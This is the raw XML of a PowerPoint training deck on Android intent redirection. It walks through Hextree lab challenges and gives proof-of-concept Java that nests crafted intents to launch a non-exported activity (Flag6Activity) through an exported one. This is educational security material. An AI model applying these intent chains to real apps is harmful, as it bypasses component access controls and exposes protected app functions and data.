              <a:rPr lang="en-GB" sz="18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GB" sz="18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"io.hextree.attacksurface.activities.Flag5Activity"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);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exploitIntent1.putExtra(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="18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r>
              <a:rPr lang="en-GB" sz="1800" dirty="0" err="1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android.intent.extra.INTENT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="18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exploitIntent2);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solidFill>
                  <a:srgbClr val="66666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// Launch the exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800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startActivity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(exploitIntent1);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1FBF47F-763B-3D78-A3F6-C8093C825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576" y="-101600"/>
            <a:ext cx="206324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667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EF86-11A2-31D9-9AAA-CF76D4E6E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.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5AFAB896-0460-0D20-7048-2F04CE5D456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382843"/>
            <a:ext cx="6917492" cy="2927689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770DA7-2F9E-A86D-0079-F92F87D8F9F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6917492" y="1241343"/>
            <a:ext cx="5274508" cy="32106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GB" sz="24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🧱 Think of it like a gift box inside another box:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" b="1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🔨 You (attacker) build it like this:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="666666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🎁 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Inner box</a:t>
            </a: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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="180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Intent3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" u="none" strike="noStrike" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial Unicode MS" panose="020B0604020202020204" pitchFamily="34" charset="-128"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> → has </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="180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"reason" = back"</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="180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📦 Wrap it in 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Intent2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" u="none" strike="noStrike" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial Unicode MS" panose="020B0604020202020204" pitchFamily="34" charset="-128"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="180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"return" = 42</a:t>
            </a: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and puts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="180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Intent3</a:t>
            </a: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as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="180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r>
              <a:rPr lang="en-GB" sz="1800" u="none" strike="noStrike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nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="180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endParaRPr lang="en-IN" sz="180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📦 Wrap it again in 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Intent1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" u="none" strike="noStrike" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial Unicode MS" panose="020B0604020202020204" pitchFamily="34" charset="-128"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> → puts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="180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Intent2</a:t>
            </a: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as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="180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r>
              <a:rPr lang="en-GB" sz="1800" u="none" strike="noStrike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android.intent.extra.INTENT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="180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endParaRPr lang="en-IN" sz="180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" name="image2.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF3E4AF2-4730-9B29-851E-E4B3837734F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365386" y="4593530"/>
            <a:ext cx="7461227" cy="2015193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln/>
        </p:spPr>
      </p:pic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D450745-D826-DDB5-76CB-1530A654F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576" y="-101600"/>
            <a:ext cx="206324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785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5DA4-B420-20B7-20D2-31936E9E3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F69681-A4A6-7D74-2E30-12419758191A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3520440" y="223180"/>
            <a:ext cx="4160520" cy="675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en-GB" sz="3600" b="1" kern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Intent Redirection</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="3600" b="1" kern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0E6701-AE0D-4D85-9005-3EE5BB75B355}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="319177" y="1319831"/>
            <a:ext cx="11553645" cy="1020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 app receives an </a:t>
            </a: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(Intent with some user-controlled data), and then </a:t>
            </a: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forwards it to another component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(activity, service, etc.) </a:t>
            </a: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without validating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where it’s going, – which can allow attackers to </a:t>
            </a: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redirect the intent to their own malicious components.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CD8935-D946-00C3-975E-EF36FDB6DF9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="209006" y="2547257"/>
            <a:ext cx="6061166" cy="25545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000" b="1" dirty="0"/>
              <a:t>📦 Step-by-step:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>🔁 The main activity receives an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t>intent (intent)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>📦 Inside that intent, there’s a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t>nested intent (intent2)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> with key:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>android.intent.extra.INTENT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>📦 Inside intent2, there’s </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t>another nested intent (intent3)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> with key:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="image18.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05C39F4F-2398-CF5F-78F3-90D034A0836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461125" y="2762154"/>
            <a:ext cx="5730875" cy="2171700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln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025109-A667-4463-8481-32CEC38316AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2468562" y="5320251"/>
            <a:ext cx="6858000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🚀  If the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>reason</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"next" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>🚀 It </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>starts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> as a new activity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, effectively redirecting the flow to that intent.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>🚀 The app redirects to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> if its </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"reason" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>equals </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"next"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/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BA61409-5CCE-D0E7-7985-555267F5F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576" y="-101600"/>
            <a:ext cx="206324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5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540AE-8029-6594-67ED-6034DC4CA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50BAC9-292A-6787-9BBB-04021C0063D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="992778" y="318258"/>
            <a:ext cx="9757954" cy="416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 b="1" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>CASE2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="20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Using Intent Redirection For Launching </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1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exported:false</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="20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Activity</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="20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808303-47F6-3E81-143F-2DC41BFA9A7B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4531404" y="722603"/>
            <a:ext cx="1724298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Flag6 Activity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7" name="image12.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9AD4A1B2-2719-E710-AC47-3DC8662EB8A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741394" y="1071155"/>
            <a:ext cx="7872867" cy="890483"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="image7.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1ECCF0FD-8BCA-874D-10EE-9D21ABE4A88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806710" y="2084466"/>
            <a:ext cx="7434944" cy="2689067"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln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8A72A9-7A66-555B-2D76-541B9AD18460}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4826675"/>
            <a:ext cx="5346452" cy="20313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GB" b="1" dirty="0" err="1"/>
              <a:t>getIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>getFlags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> → This gets all the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>flags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> set in the intent.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&amp; 1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> → This checks if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>bit 1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> is set.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> In Android, 1 means:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>Intent.FLAG_GRANT_READ_URI_PERMISSION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>!= 0</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> → If the flag is present, the condition is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>true</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>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B94FE5-5E05-43DB-0F7C-A4183D583E88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5393553" y="5242172"/>
            <a:ext cx="6690520" cy="120032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If the intent has the FLAG_GRANT_READ_URI_PERMISSION flag, then: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Log the tag "FLAG_GRANT_READ_URI_PERMISSION"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Call the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>success()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> method</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/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D9D1ED4-D49B-B6D2-AD5D-B065A019A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576" y="-101600"/>
            <a:ext cx="206324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780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B49BF0-9D33-D7F3-B380-7238DE515539}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="111033" y="421766"/>
            <a:ext cx="8614954" cy="6014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GB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POC Code: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// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err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nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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-- Intent3</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600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solidFill>
                  <a:srgbClr val="F9267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 exploitIntent3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= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600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new</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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Intent()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;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exploitIntent3.putExtra(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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"reason", "next"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);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exploitIntent3.setFlags(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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Intent.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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FLAG_GRANT_READ_URI_PERMISSION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);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exploitIntent3.setClassName(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1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io.hextree.attacksurface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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"io.hextree.attacksurface.activities.Flag6Activity"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);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// Intent2</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600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solidFill>
                  <a:srgbClr val="F9267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 exploitIntent2 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= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600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new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Intent()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;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exploitIntent2.putExtra(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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"return"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GB" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9267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42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);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exploitIntent2.putExtra(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1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nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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exploitIntent3);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// Main Intent -- Intent1</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600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solidFill>
                  <a:srgbClr val="F9267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 exploitIntent1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= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600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new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Intent()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;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exploitIntent1.setClassName(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1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io.hextree.attacksurface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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"io.hextree.attacksurface.activities.Flag5Activity"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);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exploitIntent1.putExtra(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="16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r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1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android.intent.extra.INTENT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="18803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exploitIntent2);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// Launch the intent chain</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600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6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startActivity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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(exploitIntent1);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B56A93-95BD-BAC7-66A9-3462E2A3E92B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5564777" y="2090056"/>
            <a:ext cx="6516190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🔄 How it's working:</a:t>
            </a:r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Flag5Activity is exported</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> — so you can launch it.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Flag5Activity unpacks the inner intent (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>and launches it if reason == "next"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Your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>nextIntent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (exploitIntent3) points to Flag6Activity (which is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>not exported</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Note -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> But since </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Flag5Activity is in the same app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>can launch internal activities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, even those not exported.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AAE78-D29F-B695-A486-F5F9206F7E41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7913915" y="5068389"/>
            <a:ext cx="4167052" cy="14773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✅ Impact:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>You, from an external app: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Launch Flag5Activity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Use it as a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>bridge (redirector)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> to launch Flag6Activity (non-exported)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/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193C00C-D9BE-7540-7341-3B8A12D26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76" y="-101600"/>
            <a:ext cx="206324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03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2398</TotalTime>
  <Words>1000</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>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 Unicode MS</vt:lpstr>
      <vt:lpstr>Aptos</vt:lpstr>
      <vt:lpstr>Aptos Display</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Roboto Mono</vt:lpstr>
      <vt:lpstr>WordVisi_MSFontService</vt:lpstr>
      <vt:lpstr>WordVisiCarriageReturn_MSFontService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Pawar</dc:creator>
  <cp:lastModifiedBy>Pooja Pawar</cp:lastModifiedBy>
  <cp:revision>18</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-10-05T09:48:54Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-09T06:04:33Z</dcterms:modified>
</cp:coreProperties>
</file>